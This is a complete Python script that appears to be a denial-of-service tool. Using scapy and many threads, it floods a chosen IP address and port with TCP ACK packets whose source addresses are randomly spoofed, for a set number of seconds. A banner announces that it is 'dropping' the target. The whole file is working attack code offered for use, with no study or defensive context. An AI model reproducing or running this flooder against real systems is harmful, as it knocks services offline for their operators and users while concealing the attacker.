#!/usr/bin/env python3
import sys, time, threading, socket
import random, string, os
from scapy.all import *
from urllib.parse import urlparse

_abort = False

def _udp(_ip):
    while _abort == False:
        try:
            _fraud = ".".join(str(random.randint(0, 255)) for _ in range(4))
            pkt = IP(dst=_ip, src=_fraud) / TCP(dport=int(sys.argv[2]), flags="A", seq=RandShort(), ack=RandShort())
            send(pkt, verbose=False)
        except:
            pass

def _rslv():
    _host = sys.argv[1].lower()
    if not (_host.startswith('http://') or _host.startswith('https://')):
        _host = "http://" + _host

    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
        return _domain, _ip
    except KeyboardInterrupt:
        sys.exit('\r\n DNS resolution failed!\r\n')

def main():
    if len(sys.argv) != 5:
        sys.exit('\r\n Usage: <ip/url> <port> <time> <threading>\r\n')
        
    if not os.geteuid() == 0:
        sys.exit('\r\n Script requires root elevation!\r\n')

    _domain, _ip = _rslv()
    global _abort

    os.system('clear')
    print('''
  ██████╗  ██████╗   ██████╗   ███████╗██╗     ███████╗███████╗██████╗
 ██╔════╝ ██╔═══██╗  ╚════██╗  ██╔════╝██║     ██╔════╝██╔════╝██╔══██╗
 ██║  ███╗██║   ██║   █████╔╝  ███████╗██║     █████╗  █████╗  ██████╔╝
 ██║   ██║██║   ██║  ██╔═══╝   ╚════██║██║     ██╔══╝  ██╔══╝  ██╔═══╝
 ╚██████╔╝╚██████╔╝  ███████╗  ███████║███████╗███████╗███████╗██║
  ╚═════╝  ╚═════╝   ╚══════╝  ╚══════╝╚══════╝╚══════╝╚══════╝╚═╝          
''')
    print(" Shhh....they're sleeping! Dropping " + _ip + ":" + sys.argv[2] + ' for ' + sys.argv[3] + ' seconds...\r\n')

    tasks = []
    for x in range(0, int(sys.argv[4])):
        x = threading.Thread(target=_udp, args=(_ip,))
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(sys.argv[3])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
    
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit('\r\n Done!\r\n')

if __name__ == '__main__':
    main()

